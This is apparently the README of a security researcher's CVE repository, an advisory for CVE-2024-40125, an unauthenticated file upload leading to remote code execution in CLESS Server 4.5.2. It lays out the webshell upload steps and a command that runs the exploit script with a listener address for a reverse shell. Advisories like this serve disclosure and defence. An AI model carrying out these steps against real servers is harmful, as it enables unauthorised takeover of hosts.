# 🔴 My-CVEs

> Vulnerability research, CVE advisories, and Proof-of-Concept exploits by **Brendon Teo** — Senior Penetration Tester, Singapore.

[![Author](https://img.shields.io/badge/Researcher-Brendon_Teo_(0xbr3n)-8b5cf6?style=for-the-badge&labelColor=0d1117)](https://github.com/brendontkl)
[![My Website](https://img.shields.io/badge/🌐_Portfolio-0xbren.com-8b5cf6?style=for-the-badge&labelColor=0d1117)](https://brendontkl.github.io)
[![CVEs](https://img.shields.io/badge/CVEs_Published-1-ff4757?style=for-the-badge&labelColor=0d1117)](#cve-index)
[![NVD](https://img.shields.io/badge/NVD_Verified-✓-00ff88?style=for-the-badge&labelColor=0d1117)](https://nvd.nist.gov/vuln/search/results?query=brendon+teo)
[![Disclosure](https://img.shields.io/badge/Disclosure-Responsible-00d4ff?style=for-the-badge&labelColor=0d1117)](#responsible-disclosure-policy)

---

## 📋 CVE Index

| CVE ID | Severity | CVSS | Product | Type | Published |
|--------|----------|------|---------|------|-----------|
| [CVE-2024-40125](#-cve-2024-40125) | 🔴 **CRITICAL** | **9.8** | Closed-Loop Technology CLESS Server v4.5.2 | Arbitrary File Upload → RCE | Sep 19, 2024 |

---

## 🔴 CVE-2024-40125

```
CVE ID   : CVE-2024-40125
CVSS     : 9.8 (CRITICAL)
Vector   : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
CWE      : CWE-434 — Unrestricted Upload of File with Dangerous Type
Vendor   : Closed-Loop Technology
Product  : CLESS Server
Version  : ≤ 4.5.2
Patch    : 4.5.3+
Status   : ✅ Patched · ✅ NVD Published · ✅ PoC Released
```

### Description

An arbitrary file upload vulnerability exists in the **Media Manager** function of Closed-Loop Technology CLESS Server version **4.5.2** and below. The upload endpoint performs **no file type validation** and **no authentication check**, allowing an unauthenticated remote attacker to upload a crafted PHP webshell directly to the server.

Once uploaded, the file is immediately accessible via a predictable path under the `/media/` directory, enabling the attacker to execute arbitrary operating system commands — resulting in **full Remote Code Execution (RCE)** with the privileges of the web server process, which in the tested environment ran as `NT AUTHORITY\SYSTEM`, yielding **complete administrative access** over the Windows host.

### Impact

| Category | Detail |
|---|---|
| **Confidentiality** | HIGH — full filesystem read access |
| **Integrity** | HIGH — arbitrary file write and code execution |
| **Availability** | HIGH — service disruption or complete host takeover |
| **Auth Required** | ❌ None — fully unauthenticated |
| **Network Access** | ✅ Remote — exploitable over the internet |

### Attack Chain

```
Attacker
  │
  ├─[1]─▶  GET /upload  ──────────────────────────▶  CLESS Server
  │                                                       │
  ├─[2]─▶  POST /upload  (multipart, shell.php)  ──▶  No auth check
  │                                                   No file validation
  │                ◀── {"status":"success"} ──────────────┘
  │
  ├─[3]─▶  GET /media/shell.php?cmd=whoami  ──────▶  RCE
  │
  │                ◀── "nt authority\system" ──────────────
  │
  └─[4]─▶  Reverse shell / full admin access ✓
```

### Proof of Concept

> ⚠️ For educational and authorised security research only.

See the full PoC, payload, and exploitation steps in the [CVE-2024-40125](./CVE-2024-40125) folder.

```bash
# Quick demo (requires authorised target)
cd CVE-2024-40125
python3 CVE-2024-40125.py --target http://TARGET_IP --lhost YOUR_IP --lport 4444
```

### Timeline

| Date | Event |
|---|---|
| 2024 | Vulnerability discovered during authorised engagement |
| 2024 | Vendor notified via responsible disclosure |
| 2024 | Vendor confirmed and patched in v4.5.3 |
| **Sep 19, 2024** | **CVE-2024-40125 published on NVD** |
| Sep 25, 2024 | Last modified / enriched on NVD |

### References

- 🔗 [NVD — CVE-2024-40125](https://nvd.nist.gov/vuln/detail/CVE-2024-40125)
- 🔗 [PoC Exploit](./CVE-2024-40125)
- 🔗 [CVSS 3.1 Calculator](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

---

## 📁 Repository Structure

```
My-CVEs/
└── CVE-2024-40125/
    ├── CVE-2024-40125.py     # Exploit / PoC script
    ├── README.md             # Full advisory and steps to reproduce
    └── payload/              # Supporting payloads (if any)
```

---

## ⚖️ Responsible Disclosure Policy

All vulnerabilities in this repository were discovered during **authorised security engagements** or independent research on systems I had explicit permission to test. Every CVE was disclosed responsibly:

1. **Vendor notified** prior to any public release
2. **Patch confirmed** before PoC was made public
3. **CVE assigned and published** through official channels (NVD/MITRE)
4. PoCs are released for **educational and defensive purposes only**

> Use of any exploit or payload in this repository against systems you do not have **written authorisation** to test is **illegal and unethical**. The author accepts no liability for misuse.

---

## 📬 Contact

Responsible disclosure, research collaboration, or just want to talk CVEs?

| Platform | Link |
|---|---|
| Email | [btkl123@gmail.com](mailto:btkl123@gmail.com) |
| LinkedIn | [linkedin.com/in/brendon-teo-195971152](https://www.linkedin.com/in/brendon-teo-195971152/) |
| GitHub | [github.com/brendontkl](https://github.com/brendontkl) |
| Portfolio | [0xbren.com](https://brendontkl.github.io) |

---

<div align="center">
  <sub>All research conducted ethically and responsibly · Singapore 🇸🇬</sub>
</div>
